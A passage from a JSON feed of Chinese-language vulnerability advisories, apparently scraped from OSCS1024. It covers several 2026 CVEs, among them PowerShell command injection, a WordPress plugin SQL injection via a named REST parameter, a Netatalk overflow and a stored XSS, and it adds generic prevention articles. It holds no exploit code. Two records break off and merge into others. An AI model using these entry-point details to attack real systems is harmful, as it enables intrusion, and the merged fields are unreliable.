使用安全的编程模型：使用安全的编程模型，例如避免使用原生的命令执行方式，使用安全的框架和库来处理输入数据和执行命令，避免命令注入漏洞。\n- 数据库加密和访问控制：对于敏感数据和命令，使用加密和访问控制措施，确保只有授权用户可以访问和执行命令，避免被攻击者窃取和篡改。\n- 定期更新和升级：定期更新和升级应用程序和库的版本，确保应用程序和库的最新版本包含了最新的安全补丁和修复措施，避免安全漏洞的出现和利用。\n- 安全审计和监控：定期对系统和应用程序进行安全审计和监控，及时发现和阻止潜在的安全漏洞和攻击，确保系统和数据的安全和可靠性。", "title": "如何预防命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-50523", "cvss": {"cvssv31": [{"source": "secure@microsoft.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-77", "description": "Microsoft PowerShell 中命令中使用的特殊元素的不正确中和（“命令注入”）允许授权攻击者在本地执行代码。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "命令注入", "kind_en": "命令中使用的特殊元素的不正确中和（“命令注入”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-mwth-k9rf", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-mwth-k9rf", "name": "https://www.oscs1024.com/hd/MPS-mwth-k9rf"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-50523", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-50523"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50523", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-50523漏洞", "_translated": true, "_saved_at": "2026-08-14T23:16:13+00:00", "_first_saved_at": "2026-08-14T22:16:10+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-mwth-k9rf"}, {"analysis_status": 0, "articles": [{"content": "应用程序在权限管理方面存在缺陷，未能正确地验证和限制用户的权限。这可能包括访问控制列表（ACL）的不当配置、权限检查的缺失或错误、不恰当的身份验证和授权过程等。攻击者可以利用这些缺陷来绕过访问控制，获得未经授权的权限，执行敏感操作或访问敏感信息。", "title": "什么是权限管理不当"}, {"content": "- 水平权限提升：攻击者以与当前授权相同的权限冒充其他用户，获取对其他用户的访问权限。这可能是由于应用程序未能适当验证和限制用户的身份验证和授权。\r\n- 垂直权限提升：攻击者以比其当前授权更高的权限执行操作，获取对更高权限资源的访问。这可以发生在应用程序未正确验证用户请求的权限级别，或者在权限检查过程中存在漏洞的情况下。\r\n- 特权维持：攻击者通过利用特权管理的不当实施，将其特权保持在系统中。这可以包括未及时撤销特权、未正确管理特权的生命周期等。", "title": "权限管理不当常见的攻击方式"}, {"content": "- 适当的访问控制：应用程序应该实施适当的访问控制机制，包括强制访问控制列表（ACL）、角色基础访问控制（RBAC）、最小权限原则等，以确保用户只能访问其授权范围内的资源。\r\n- 身份验证和授权的正确实施：应用程序应该正确实施身份验证和授权机制，包括验证用户的身份、验证请求的权限级别，以及在授权过程中进行必要的权限检查。\r\n- 权限分离原则：应用程序应该根据职责和功能将特权分离，并只授予用户所需的最低权限，遵循最小特权原则。\r\n- 审计和监控：应用程序应该记录和监控特权操作，及时检测和响应异常或未经授权的特权访问。\r\n- 安全编码实践：开发人员应遵循安全编码实践，如输入验证、输出编码、错误处理等，以防止特权管理不当的漏洞。", "title": "如何预防权限管理不当"}], "cnvd_id": "", "cve_id": "CVE-2026-63700", "cvss": {"cvssv31": [{"source": "security_alert@emc.com", "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H", "cwe": "CWE-269", "description": "Dell Wyse Management Suite (WMS) 2605.0.2 之前的版本包含不正确的默认权限漏洞。具有本地访问权限的低权限攻击者可能会利用此漏洞，导致权限提升。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "可选修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-smha-y50r", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-smha-y50r", "name": "https://www.oscs1024.com/hd/MPS-smha-y50r"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63700", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-63700"}, {"url": "https://www.dell.com/support/kbdoc/en-us/000493271/dsa-2026-329-security-update-for-dell-wyse-management-suite-wms-for-multiple-vulnerabilities", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-63700漏洞", "_translated": true, "_saved_at": "2026-08-14T16:48:38+00:00", "_first_saved_at": "2026-08-14T16:48:38+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-smha-y50r"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-45699", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-191", "description": "Netatalk 是一个用于类 Unix 操作系统的免费开源文件服务器套件。在版本 3.1.19 到 4.4.2 中，Netatalk 的 afpd 守护程序的 copydir() 函数中存在基于堆栈的缓冲区溢出，这是由于在计算用于路径构建的剩余缓冲区大小时出现整数下溢。 copydir() 是一个实用程序函数，当文件操作跨越 AFP 共享卷内的设备边界时调用，这是标准库的 renameat() 无法处理的。该函数尝试使用 srem 和 drem 来跟踪源路径和目标路径的可用缓冲区空间。不正确的算术会导致 srem 和 drem 下溢至 SIZE_MAX。因此，针对 strlen(de-\u003ed_name) 的边界检查总是通过，从而允许 strcpy() 将文件名附加到几乎已满的堆栈缓冲区中。 4.4.3 版本修复了该问题。作为解决方法，将每个 AFP 共享卷配置为单个文件系统，换句话说，共享卷的子目录不应成为不同文件系统的安装点。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "超界折返", "kind_en": "整数下溢（环绕或环绕）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-0lbu-f36h", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-0lbu-f36h", "name": "https://www.oscs1024.com/hd/MPS-0lbu-f36h"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45699", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-45699"}, {"url": "https://github.com/Netatalk/netatalk/releases/tag/netatalk-4-4-3", "name": ""}, {"url": "https://github.com/Netatalk/netatalk/security/advisories/GHSA-fphv-pf29-p77m", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-45699漏洞", "_translated": true, "_saved_at": "2026-08-14T20:25:08+00:00", "_first_saved_at": "2026-08-14T20:25:08+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-0lbu-f36h"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-19474", "cvss": {"cvssv31": [{"source": "ce714d77-add3-4f53-aff5-83d477b104bb", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "cwe": "CWE-770", "description": "@fastify/multipart 是 Fastify 的多部分表单数据解析器。在从 3.0.0 到（但不包括 10.1.1）的版本中，当解析器在多部分之间前进时客户端断开连接时，request.saveRequestFiles() 可以在磁盘上保留已完成的临时文件。各部分之间发生的迭代器拒绝落在每个文件的清理路径之外，因此永远不会删除较早完成的文件。未经身份验证的客户端可能会重复此操作，从而导致持久的线性磁盘消耗，从而导致拒绝服务。这是 CVE-2025-24033 的不完整修复变体。该问题已在 @fastify/mu url": "https://www.vulncheck.com/advisories/zerobrew-version-and-prior-missing-checksum-verification-rce-via-shim-rb", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-53970漏洞", "_translated": true, "_saved_at": "2026-08-14T16:48:44+00:00", "_first_saved_at": "2026-08-14T16:48:44+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-e4pv-xjou"}, {"analysis_status": 0, "articles": [{"content": "当应用程序接受来自用户的输入，并将其直接拼接到SQL查询语句中，而没有对输入进行充分的验证和转义时，就会发生SQL注入。攻击者可以通过在输入中插入恶意的SQL代码，改变原始查询的意图，从而执行未经授权的操作或访问敏感数据。", "title": "什么是SQL注入"}, {"content": "- 基于错误的输入过滤：攻击者通过向输入字段中插入特殊字符或SQL语句片段来破坏应用程序的输入过滤机制。这可能导致应用程序执行意外的SQL查询。\n- 基于布尔盲注：攻击者利用应用程序在查询结果中显示的不同响应来确定SQL语句的真假。通过构造特定的查询，攻击者可以逐步推断出数据库的结构和敏感信息。\n- 基于时间的盲注：攻击者通过在SQL查询中插入延迟语句来测试条件的真假。通过测量响应时间的差异，攻击者可以推断出SQL语句的真假和敏感数据的存在性。", "title": "SQL注入常见的攻击方式"}, {"content": "- 使用参数化查询或预编译语句：避免将用户输入直接拼接到SQL查询语句中，而是使用参数化查询或预编译语句。这样可以将用户输入作为参数传递给查询，从而避免了注入攻击。\n- 输入验证和过滤：对用户输入进行充分的验证和过滤，确保输入符合预期的格式和范围。可以使用白名单验证、正则表达式或输入验证库等方法来过滤输入。\n- 最小权限原则：确保数据库用户具有最小的权限，并严格限制其对敏感数据和数据库操作的访问权限。\n- 不透明化敏感数据：对于敏感数据，如密码和信用卡号等，应该使用适当的加密和哈希算法进行存储，以减少数据泄露的风险。\n- 定期更新和维护：及时应用数据库供应商发布的安全补丁和更新，以修复已知的漏洞和弱点。", "title": "如何预防SQL注入"}], "cnvd_id": "", "cve_id": "CVE-2026-15162", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "cwe": "CWE-89", "description": "Object Sync for Salesforce 插件容易通过其 /wp-json/object-sync-for-salesforce/push/ REST 路由的 wordpress_object_type 参数遭受未经身份验证的 SQL 注入。路由的权限回调 (can_process()) 仅检查推送类的 HTTP 方法 - 无功能或随机数 - 因此未经身份验证的用户可以访问它。 wordpress_object_type 值直接连接到 SQL 查询中（post_type = \"$object_type\", class-object-sync-sf-wordpress.php:328），并通过 $wpdb-\u003eget_results() 执行，而不使用 $wpdb-\u003eprepare() (:578)。由于 REST 正文参数没有魔术引用，因此攻击者可以突破引用的字符串并注入任意 SQL。这使得未经身份验证的攻击者可以附加额外的 SQL 查询（基于时间的盲查询），从而能够从数据库中提取敏感信息，例如密码哈希值。仅需要有效的 wordpress_id（例如 1）——无需身份验证或 Salesforce 连接。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "SQL注入", "kind_en": "SQL 命令中使用的特殊元素的不正确中和（“SQL 注入”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-gxa6-kyzq", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-gxa6-kyzq", "name": "https://www.oscs1024.com/hd/MPS-gxa6-kyzq"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15162", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-15162"}, {"url": "https://plugins.trac.wordpress.org/browser/object-sync-for-salesforce/trunk/classes/class-object-sync-sf-rest.php#L224", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/object-sync-for-salesforce/trunk/classes/class-object-sync-sf-salesforce-push.php#L210", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/object-sync-for-salesforce/trunk/classes/class-object-sync-sf-wordpress.php#L328", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/object-sync-for-salesforce/trunk/classes/class-object-sync-sf-wordpress.php#L578", "name": ""}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/78f964a7-bed3-435e-94c5-750883a0c836?source=cve", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-15162漏洞", "_translated": true, "_saved_at": "2026-08-15T04:23:35+00:00", "_first_saved_at": "2026-08-15T04:23:35+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-gxa6-kyzq"}, {"analysis_status": 0, "articles": [{"content": "应用程序在权限管理方面存在缺陷，未能正确地验证和限制用户的权限。这可能包括访问控制列表（ACL）的不当配置、权限检查的缺失或错误、不恰当的身份验证和授权过程等。攻击者可以利用这些缺陷来绕过访问控制，获得未经授权的权限，执行敏感操作或访问敏感信息。", "title": "什么是权限管理不当"}, {"content": "- 水平权限提升：攻击者以与当前授权相同的权限冒充其他用户，获取对其他用户的访问权限。这可能是由于应用程序未能适当验证和限制用户的身份验证和授权。\r\n- 垂直权限提升：攻击者以比其当前授权更高的权限执行操作，获取对更高权限资源的访问。这可以发生在应用程序未正确验证用户请求的权限级别，或者在权限检查过程中存在漏洞的情况下。\r\n- 特权维持：攻击者通过利用特权管理的不当实施，将其特权保持在系统中。这可以包括未及时撤销特权、未正确管理特权的生命周期等。", "title": "权限管理不当常见的攻击方式"}, {"content": "- 适当的访问控制：应用程序应该实施适当的访问控制机制，包括强制访问控制列表（ACL）、角色基础访问控制（RBAC）、最小权限原则等，以确保用户只能访问其授权范围内的资源。\r\n- 身份验证和授权的正确实施：应用程序应该正确实施身份验证和授权机制，包括验证用户的身份、验证请求的权限级别，以及在授权过程中进行必要的权限检查。\r\n- 权限分离原则：应用程序应该根据职责和功能将特权分离，并只授予用户所需的最低权限，遵循最小特权原则。\r\n- 审计和监控：应用程序应该记录和监控特权操作，及时检测和响应异常或未经授权的特权访问。\r\n- 安全编码实践：开发人员应遵循安全编码实践，如输入验证、输出编码、错误处理等，以防止特权管理不当的漏洞。", "title": "如何预防权限管理不当"}], "cnvd_id": "", "cve_id": "CVE-2026-15142", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.5}]}, "cvss_score": 7.5, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-269", "description": "WordPress 的 Real Estate Manager Pro 插件在 12.8.6 及之前的所有版本中都容易受到权限升级的影响。这是由于allow_attachment_actions() 函数中的能力处理不当造成的，该函数可能会在用户能力检查期间将目标用户 ID 视为媒体附件 ID。这使得具有订阅者级及以上访问权限的经过身份验证的攻击者可以编辑管理员帐户，并在目标用户 ID 与现有媒体附件的 ID 匹配时将其权限升级为管理员。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-j9ul-dqro", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-j9ul-dqro", "name": "https://www.oscs1024.com/hd/MPS-j9ul-dqro"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15142", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-15142"}, {"url": "https://wp-rem.com/changelog/", "name": ""}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/71e9ff91-4137-4c66-959b-f4ffb8d3ba32?source=cve", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-15142漏洞", "_translated": true, "_saved_at": "2026-08-15T14:16:07+00:00", "_first_saved_at": "2026-08-15T10:16:13+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-j9ul-dqro"}, {"analysis_status": 0, "articles": [], "cnvd X/U:X", "severity": "high", "base_score": 7.4}]}, "cvss_score": 7.4, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-121", "description": "TOTOLINK A800R 4.1.2cu.5137_B20200730 中发现安全漏洞。受影响的是组件wps.so的文件/cgi-bin/cstecgi.cgi的函数setWiFiWpsConfig。对参数 pin 的操作会导致基于堆栈的缓冲区溢出。攻击可以远程发起。该漏洞已向公众发布，可用于攻击。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "栈缓冲区溢出", "kind_en": "基于堆栈的缓冲区溢出", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-x4i6-f5dr", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-x4i6-f5dr", "name": "https://www.oscs1024.com/hd/MPS-x4i6-f5dr"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19847", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19847"}, {"url": "https://github.com/panda666-888/vuls/blob/main/totolink/a800r/setWiFiWpsConfig.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19847", "name": ""}, {"url": "https://vuldb.com/submit/869457", "name": ""}, {"url": "https://vuldb.com/vuln/389983", "name": ""}, {"url": "https://vuldb.com/vuln/389983/cti", "name": ""}, {"url": "https://www.totolink.net/", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19847漏洞", "_translated": true, "_saved_at": "2026-08-14T19:44:08+00:00", "_first_saved_at": "2026-08-14T18:44:22+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-x4i6-f5dr"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-14433", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "cwe": "CWE-79", "description": "由于输入清理和输出转义不足，WordPress vcita 插件的 WordPress 在线预订和安排日历在 4.6.0 及之前的所有版本中很容易通过“business_id”参数受到存储跨站点脚本攻击。这使得未经身份验证的攻击者可以在页面中注入任意 Web 脚本，每当用户访问注入的页面时就会执行这些脚本。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-8dlk-604p", "poc": false, "poc_url": [], "published_time": "2026-08-15",
